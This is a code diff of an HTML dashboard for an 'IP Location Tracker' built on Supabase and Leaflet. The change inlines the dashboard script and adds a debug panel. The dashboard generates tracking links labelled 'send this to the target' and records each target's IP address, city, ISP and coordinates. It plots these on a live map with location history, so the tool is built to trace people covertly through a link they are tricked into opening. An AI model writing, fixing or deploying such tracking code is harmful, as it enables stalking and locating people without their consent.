@@ -9,20 +9,19 @@
 </head>
 <body>
   <div class="app-container">
-    <!-- Header -->
     <header class="header">
       <h1><span class="icon">📡</span> IP Location Tracker</h1>
-      <span class="badge">LIVE DASHBOARD</span>
+      <span class="badge" id="statusBadge">CONNECTING...</span>
     </header>
 
-    <!-- Sidebar -->
     <aside class="sidebar">
       <div class="sidebar-section">
         <h3>➕ New Tracking Session</h3>
         <form class="create-form" id="createForm">
           <input type="text" id="sessionName" placeholder='e.g. "John Phone"' maxlength="50" required />
-          <button type="submit" class="btn btn-primary">Track</button>
+          <button type="submit" class="btn btn-primary" id="createBtn">Track</button>
         </form>
+        <div id="createError" style="color:#ff4757;font-size:0.8rem;margin-top:8px;display:none;"></div>
       </div>
 
       <div class="sidebar-section" style="padding-bottom: 8px;">
@@ -37,17 +36,14 @@
       </div>
     </aside>
 
-    <!-- Map -->
     <main class="map-container">
       <div id="map"></div>
 
-      <!-- Info Panel -->
       <div class="info-panel" id="infoPanel">
         <div class="panel-header">
           <h3 id="panelTitle">Session Details</h3>
           <button class="close-btn" id="closePanel">✕</button>
         </div>
-
         <div class="tracking-url-box">
           <label>🔗 Tracking URL — send this to the target</label>
           <div class="url-row">
@@ -55,41 +51,391 @@
             <button type="button" class="btn btn-sm btn-ghost" id="copyUrlBtn">📋 Copy</button>
           </div>
         </div>
-
         <div class="panel-actions">
           <button type="button" class="btn btn-sm btn-ghost" id="toggleBtn">⏸ Pause</button>
           <button type="button" class="btn btn-sm btn-danger" id="deleteBtn">🗑 Delete</button>
         </div>
-
         <div class="location-history" id="locationHistory">
           <h4>📍 Location History</h4>
-          <div class="empty-state">
-            <p>Waiting for target to open the link…</p>
-          </div>
+          <div class="empty-state"><p>Waiting for target to open the link…</p></div>
         </div>
       </div>
     </main>
   </div>
 
-  <!-- Toast -->
   <div class="toast-container" id="toastContainer"></div>
 
-  <!-- Loading indicator -->
-  <div id="loadingOverlay" style="
-    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-    background: rgba(15,15,26,0.95); z-index: 10000;
-    display: flex; align-items: center; justify-content: center;
-    flex-direction: column; gap: 16px; color: #00d4ff;
-    font-family: 'Segoe UI', system-ui, sans-serif;
+  <!-- Debug panel - shows errors clearly -->
+  <div id="debugPanel" style="
+    position:fixed; bottom:0; left:0; right:0;
+    background:#1a1a2e; border-top:2px solid #ff4757;
+    padding:16px 24px; font-family:monospace; font-size:13px;
+    color:#ff4757; z-index:99999; display:none; max-height:200px; overflow-y:auto;
   ">
-    <div style="font-size: 2rem;">📡</div>
-    <div>Connecting to database...</div>
+    <strong>⚠️ DEBUG:</strong>
+    <div id="debugMessages"></div>
   </div>
 
-  <!-- Scripts — note the ./ prefix for relative paths -->
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="./js/config.js"></script>
-  <script src="./js/dashboard.js"></script>
+  <script>
+    // ══════════════════════════════════════════════
+    // INLINE DASHBOARD - guaranteed to run
+    // ══════════════════════════════════════════════
+
+    const DEBUG = [];
+    function debug(msg, isError = false) {
+      const timestamp = new Date().toLocaleTimeString();
+      const line = `[${timestamp}] ${msg}`;
+      console.log(line);
+      DEBUG.push(line);
+
+      if (isError) {
+        const panel = document.getElementById('debugPanel');
+        const msgs = document.getElementById('debugMessages');
+        panel.style.display = 'block';
+        msgs.innerHTML += `<div style="margin:4px 0;color:${isError ? '#ff4757' : '#00d4ff'}">${escHtml(msg)}</div>`;
+      }
+    }
+
+    let db, map, activeSessionId = null, realtimeChannel = null;
+    const markerGroups = new Map();
+
+    function toast(msg, type = 'info') {
+      debug(msg);
+      const el = document.createElement('div');
+      el.className = `toast ${type}`;
+      el.textContent = msg;
+      document.getElementById('toastContainer').appendChild(el);
+      setTimeout(() => el.remove(), 5000);
+    }
+
+    // ── INIT ─────────────────────────────────────
+    (async function main() {
+      debug('Starting dashboard...');
+
+      // Step 1: Check config values
+      if (typeof SUPABASE_URL === 'undefined') {
+        debug('SUPABASE_URL is not defined! config.js did not load.', true);
+        debug('Check that js/config.js file exists and has no syntax errors.', true);
+        document.getElementById('statusBadge').textContent = 'CONFIG ERROR';
+        document.getElementById('statusBadge').style.color = '#ff4757';
+        return;
+      }
+
+      if (SUPABASE_URL.includes('REPLACE_THIS') || SUPABASE_ANON_KEY.includes('REPLACE_THIS')) {
+        debug('You have not set your Supabase credentials in js/config.js!', true);
+        debug('Go to Supabase → Settings → API and copy your URL and anon key.', true);
+        document.getElementById('statusBadge').textContent = 'NOT CONFIGURED';
+        document.getElementById('statusBadge').style.color = '#ff4757';
+        return;
+      }
+
+      debug('Config OK: ' + SUPABASE_URL);
+
+      // Step 2: Create client
+      try {
+        db = getSupabase();
+        debug('Supabase client created');
+      } catch (e) {
+        debug('Failed to create Supabase client: ' + e.message, true);
+        document.getElementById('statusBadge').textContent = 'CLIENT ERROR';
+        return;
+      }
+
+      // Step 3: Init map
+      try {
+        map = L.map('map', { center: [20, 0], zoom: 2, attributionControl: false });
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19 }).addTo(map);
+        debug('Map initialized');
+      } catch (e) {
+        debug('Map error: ' + e.message, true);
+      }
+
+      // Step 4: Test database connection
+      debug('Testing database connection...');
+      try {
+        const { data, error } = await db.from('sessions').select('id').limit(1);
+
+        if (error) {
+          debug('DATABASE ERROR: ' + error.message, true);
+          debug('Error code: ' + (error.code || 'none'), true);
+          debug('Hint: ' + (error.hint || 'none'), true);
+
+          if (error.message.includes('does not exist')) {
+            debug('FIX: Go to Supabase → SQL Editor and run the CREATE TABLE SQL.', true);
+          } else if (error.message.includes('policy') || error.code === '42501') {
+            debug('FIX: RLS policies missing. Run the full SQL including CREATE POLICY statements.', true);
+          } else if (error.message.includes('JWT') || error.message.includes('apikey')) {
+            debug('FIX: Your SUPABASE_ANON_KEY in config.js is wrong. Copy the correct one from Supabase → Settings → API.', true);
+          }
+
+          document.getElementById('statusBadge').textContent = 'DB ERROR';
+          document.getElementById('statusBadge').style.color = '#ff4757';
+          return;
+        }
+
+        debug('Database connected! Sessions found: ' + (data?.length || 0));
+      } catch (e) {
+        debug('Network error connecting to Supabase: ' + e.message, true);
+        debug('FIX: Check your SUPABASE_URL in config.js. Make sure it starts with https://', true);
+        document.getElementById('statusBadge').textContent = 'NETWORK ERROR';
+        document.getElementById('statusBadge').style.color = '#ff4757';
+        return;
+      }
+
+      // Step 5: Everything works!
+      document.getElementById('statusBadge').textContent = 'LIVE DASHBOARD';
+      document.getElementById('statusBadge').style.background = 'rgba(0,212,255,0.15)';
+      document.getElementById('statusBadge').style.color = '#00d4ff';
+      debug('✅ Dashboard ready!');
+
+      // Load sessions
+      await loadSessions();
+
+      // ── Event Listeners ──────────────────────
+      document.getElementById('createForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const input = document.getElementById('sessionName');
+        const errorEl = document.getElementById('createError');
+        const name = input.value.trim();
+
+        if (!name) {
+          errorEl.textContent = 'Please enter a name';
+          errorEl.style.display = 'block';
+          return;
+        }
+
+        errorEl.style.display = 'none';
+        const btn = document.getElementById('createBtn');
+        btn.disabled = true;
+        btn.textContent = 'Creating...';
+
+        try {
+          await createSession(name);
+          input.value = '';
+        } catch (err) {
+          errorEl.textContent = 'Error: ' + err.message;
+          errorEl.style.display = 'block';
+        }
+
+        btn.disabled = false;
+        btn.textContent = 'Track';
+      });
+
+      document.getElementById('closePanel').addEventListener('click', () => {
+        document.getElementById('infoPanel').classList.remove('visible');
+        activeSessionId = null;
+        if (realtimeChannel) { db.removeChannel(realtimeChannel); realtimeChannel = null; }
+        document.querySelectorAll('.session-card').forEach(c => c.classList.remove('active'));
+      });
+
+      document.getElementById('copyUrlBtn').addEventListener('click', () => {
+        const input = document.getElementById('trackingUrl');
+        navigator.clipboard.writeText(input.value)
+          .then(() => toast('📋 Copied!', 'success'))
+          .catch(() => { input.select(); document.execCommand('copy'); toast('📋 Copied!', 'success'); });
+      });
+
+      document.getElementById('toggleBtn').addEventListener('click', toggleSession);
+      document.getElementById('deleteBtn').addEventListener('click', deleteSession);
+
+      // Auto refresh
+      setInterval(loadSessions, 30000);
+    })();
+
+    // ══════════════════════════════════════════════
+    // FUNCTIONS
+    // ══════════════════════════════════════════════
+
+    async function loadSessions() {
+      const { data: sessions, error } = await db
+        .from('sessions')
+        .select('*')
+        .order('created_at', { ascending: false });
+
+      if (error) { debug('Load error: ' + error.message, true); return; }
+
+      const enriched = [];
+      for (const s of sessions) {
+        const { count } = await db
+          .from('locations')
+          .select('*', { count: 'exact', head: true })
+          .eq('session_id', s.id);
+
+        const { data: latest } = await db
+          .from('locations')
+          .select('created_at')
+          .eq('session_id', s.id)
+          .order('created_at', { ascending: false })
+          .limit(1);
+
+        enriched.push({
+          ...s,
+          ping_count: count || 0,
+          last_seen: latest?.[0]?.created_at || null,
+        });
+      }
+
+      renderSessions(enriched);
+    }
+
+    function renderSessions(sessions) {
+      const el = document.getElementById('sessionsList');
+      if (!sessions.length) {
+        el.innerHTML = '<div class="empty-state"><div class="icon">📭</div><p>No sessions yet.<br>Create one to start tracking.</p></div>';
+        return;
+      }
+      el.innerHTML = sessions.map(s => `
+        <div class="session-card ${s.id === activeSessionId ? 'active' : ''}"
+             data-id="${s.id}" onclick="selectSession('${s.id}')">
+          <div class="name">
+            <span class="status-dot ${s.is_active ? 'active' : 'inactive'}"></span>
+            ${escHtml(s.name)}
+          </div>
+          <div class="meta">
+            <span>🏓 ${s.ping_count} pings</span>
+            <span>👁 ${s.last_seen ? timeAgo(s.last_seen) : 'Never'}</span>
+          </div>
+        </div>
+      `).join('');
+    }
+
+    async function createSession(name) {
+      const id = generateId();
+      debug('Creating session: ' + name + ' (' + id + ')');
+
+      const { data, error } = await db
+        .from('sessions')
+        .insert({ id, name })
+        .select();
+
+      if (error) {
+        debug('Create FAILED: ' + error.message, true);
+        debug('Code: ' + error.code + ' | Details: ' + (error.details || 'none'), true);
+        toast('❌ ' + error.message, 'error');
+        throw error;
+      }
+
+      debug('✅ Session created: ' + JSON.stringify(data));
+      toast('✅ Session "' + name + '" created!', 'success');
+      await loadSessions();
+      await selectSession(id);
+    }
+
+    async function selectSession(id) {
+      debug('Selecting: ' + id);
+      activeSessionId = id;
+
+      if (realtimeChannel) { db.removeChannel(realtimeChannel); realtimeChannel = null; }
+
+      const { data: session } = await db
+        .from('sessions').select('*').eq('id', id).single();
+      if (!session) { toast('Not found', 'error'); return; }
+
+      const { data: locations } = await db
+        .from('locations').select('*').eq('session_id', id)
+        .order('created_at', { ascending: false }).limit(200);
+
+      // Panel
+      document.getElementById('infoPanel').classList.add('visible');
+      document.getElementById('panelTitle').innerHTML =
+        escHtml(session.name) + (session.is_active
+          ? ' <span class="live-badge"><span class="pulse"></span>LIVE</span>'
+          : ' <span class="badge" style="background:var(--text-muted);color:#000">PAUSED</span>');
+
+      // URL
+      const base = window.location.href.replace(/\/[^/]*$/, '');
+      document.getElementById('trackingUrl').value = base + '/track.html?s=' + id;
+      document.getElementById('toggleBtn').textContent = session.is_active ? '⏸ Pause' : '▶ Resume';
+
+      renderLocations(locations || []);
+      updateMap(id, locations || []);
+
+      document.querySelectorAll('.session-card').forEach(c =>
+        c.classList.toggle('active', c.dataset.id === id));
+
+      // Realtime
+      realtimeChannel = db.channel('loc-' + id)
+        .on('postgres_changes', {
+          event: 'INSERT', schema: 'public', table: 'locations',
+          filter: 'session_id=eq.' + id,
+        }, () => { toast('📍 New ping!', 'success'); selectSession(id); })
+        .subscribe(status => debug('Realtime: ' + status));
+    }
+
+    function renderLocations(locations) {
+      const el = document.getElementById('locationHistory');
+      if (!locations.length) {
+        el.innerHTML = '<h4>📍 Location History</h4><div class="empty-state"><p>Waiting for target…</p></div>';
+        return;
+      }
+      el.innerHTML = '<h4>📍 Location History (' + locations.length + ')</h4>' +
+        locations.map((loc, i) => `
+          <div class="location-entry">
+            <div class="coords">
+              ${loc.latitude?.toFixed(6) ?? '?'}, ${loc.longitude?.toFixed(6) ?? '?'}
+              ${i === 0 ? '<span class="live-badge" style="margin-left:8px"><span class="pulse"></span>Latest</span>' : ''}
+            </div>
+            <div class="details">
+              📍 ${escHtml(loc.city)}, ${escHtml(loc.region)}, ${escHtml(loc.country)}<br>
+              🌐 IP: <code>${escHtml(loc.ip)}</code><br>
+              🏢 ISP: ${escHtml(loc.isp)}<br>
+              🎯 ${escHtml(loc.accuracy)}
+            </div>
+            <div class="time">${new Date(loc.created_at).toLocaleString()}</div>
+          </div>
+        `).join('');
+    }
+
+    function updateMap(sid, locations) {
+      if (markerGroups.has(sid)) { map.removeLayer(markerGroups.get(sid)); }
+      const valid = locations.filter(l => l.latitude && l.longitude);
+      if (!valid.length) return;
+
+      const group = L.layerGroup();
+      if (valid.length > 1) {
+        L.polyline(valid.map(l => [l.latitude, l.longitude]),
+          { color: '#00d4ff', weight: 2, opacity: 0.5, dashArray: '5,10' }).addTo(group);
+      }
+      valid.forEach((loc, i) => {
+        const latest = i === 0;
+        const icon = L.divIcon({
+          className: 'custom-marker',
+          html: '<div class="marker-ping ' + (latest ? 'latest' : '') + '" style="opacity:' + (latest ? 1 : 0.4) + ';width:' + (latest ? 22 : 10) + 'px;height:' + (latest ? 22 : 10) + 'px"></div>',
+          iconSize: [22, 22], iconAnchor: [11, 11],
+        });
+        L.marker([loc.latitude, loc.longitude], { icon })
+          .bindPopup('<div style="font-size:13px;line-height:1.6"><strong>' + escHtml(loc.city) + ', ' + escHtml(loc.country) + '</strong><br>IP: <code>' + escHtml(loc.ip) + '</code><br>ISP: ' + escHtml(loc.isp) + '<br>' + escHtml(loc.accuracy) + '<br>' + new Date(loc.created_at).toLocaleString() + '</div>')
+          .addTo(group);
+      });
+      group.addTo(map);
+      markerGroups.set(sid, group);
+      map.flyTo([valid[0].latitude, valid[0].longitude], 13, { duration: 1.5 });
+    }
+
+    async function toggleSession() {
+      if (!activeSessionId) return;
+      const { data: s } = await db.from('sessions').select('is_active').eq('id', activeSessionId).single();
+      await db.from('sessions').update({ is_active: !s.is_active }).eq('id', activeSessionId);
+      toast(s.is_active ? '⏸ Paused' : '▶ Resumed', 'info');
+      await loadSessions();
+      selectSession(activeSessionId);
+    }
+
+    async function deleteSession() {
+      if (!activeSessionId || !confirm('Delete this session?')) return;
+      const id = activeSessionId;
+      if (realtimeChannel) { db.removeChannel(realtimeChannel); realtimeChannel = null; }
+      if (markerGroups.has(id)) { map.removeLayer(markerGroups.get(id)); markerGroups.delete(id); }
+      await db.from('locations').delete().eq('session_id', id);
+      await db.from('sessions').delete().eq('id', id);
+      activeSessionId = null;
+      document.getElementById('infoPanel').classList.remove('visible');
+      toast('🗑 Deleted', 'error');
+      await loadSessions();
+    }
+  </script>
 </body>
 </html>
